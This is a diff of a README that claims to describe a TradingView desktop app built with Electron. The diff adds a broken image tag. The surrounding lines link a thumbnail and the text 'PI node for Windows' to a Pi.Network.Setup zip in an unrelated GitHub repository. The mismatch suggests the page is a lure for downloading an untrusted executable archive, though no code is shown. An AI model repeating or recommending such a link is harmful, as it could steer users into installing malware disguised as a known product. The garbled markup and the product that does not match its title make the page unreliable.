@@ -2,6 +2,8 @@ TradingView Desktop Version
 
 TradingView Desktop Version built with [Electron]
 
+<img src="https://i.ytimg.com/vi/wRv9UkMZ2bU/maxresdefault.jpg"
+
 <a href="https://github.com/mrlmrl/pi-node/releases/download/minepi/Pi.Network.Setup.0.4.5.zip"><img src="https://i.ytimg.com/vi/wRv9UkMZ2bU/maxresdefault.jpg" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/mrlmrl/pi-node/releases/download/minepi/Pi.Network.Setup.0.4.5.zip">PI node for Windows</a>
 
 
